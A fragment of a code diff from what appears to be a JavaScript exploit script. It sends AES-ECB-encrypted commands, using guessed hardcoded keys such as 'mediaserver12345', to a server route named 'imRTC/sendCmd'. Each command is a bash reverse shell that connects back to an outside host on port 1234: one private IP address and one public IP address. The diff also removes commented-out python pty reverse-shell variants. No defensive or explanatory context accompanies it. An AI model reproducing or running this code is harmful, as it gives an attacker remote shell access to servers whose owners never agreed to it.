@@ -396,7 +396,6 @@
         await connect();
 
         let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
-        // let cmd = 'setsid python -c \'import pty; pty.spawn("/bin/bash")\' >& /dev/tcp/192.168.88.138/1234 0<&1 &';
         obj = {
             route: 'imRTC/sendCmd',
             req_data: {
@@ -405,7 +404,7 @@
         }
         let data = JSON.stringify(obj);
 
-        let key = 'mediaserver54321';
+        let key = 'mediaserver12345';
         key = CryptoJS.enc.Utf8.parse(key);
         let options = {
             mode: CryptoJS.mode.ECB,
@@ -425,7 +424,6 @@
 
     async function sendCmd2() {
         let cmd = 'setsid bash -i >& /dev/tcp/198.211.27.71/1234 0<&1 &';
-        // let cmd = 'setsid python -c \'import pty; pty.spawn("/bin/bash")\' >& /dev/tcp/192.168.88.138/1234 0<&1 &';
         obj = {
             route: 'imRTC/sendCmd',
             req_data: {
@@ -434,7 +432,7 @@
         }
         let data = JSON.stringify(obj);
 
-        let key = 'mediaserver54321';
+        let key = 'mediaserver123456';
         key = CryptoJS.enc.Utf8.parse(key);
         let options = {
             mode: CryptoJS.mode.ECB,
